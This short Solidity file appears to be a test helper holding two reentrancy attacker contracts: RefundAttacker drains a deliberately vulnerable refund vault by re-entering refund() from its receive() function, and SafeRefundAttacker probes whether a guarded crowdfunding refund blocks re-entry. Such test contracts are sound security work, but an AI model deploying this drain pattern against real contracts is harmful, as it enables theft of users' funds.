// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableRefundVault { function deposit() external payable; function refund() external; }
interface ICrowdfundingRefund { function contribute(uint256 id) external payable; function refund(uint256 id) external; }
contract RefundAttacker {
    IVulnerableRefundVault public immutable target;
    uint256 public received;
    constructor(address target_) { target = IVulnerableRefundVault(target_); }
    function attack() external payable { target.deposit{value: msg.value}(); target.refund(); }
    receive() external payable {
        received += msg.value;
        if (address(target).balance >= 1 ether) target.refund();
    }
}

/// @dev Re-entry probe for the real guarded campaign refund.
contract SafeRefundAttacker {
    ICrowdfundingRefund public immutable target;
    uint256 public immutable campaignId;
    bool public reentryBlocked;
    constructor(address target_, uint256 campaignId_) { target = ICrowdfundingRefund(target_); campaignId = campaignId_; }
    function contribute() external payable { target.contribute{value: msg.value}(campaignId); }
    function attackRefund() external { target.refund(campaignId); }
    receive() external payable {
        try target.refund(campaignId) { } catch { reentryBlocked = true; }
    }
}
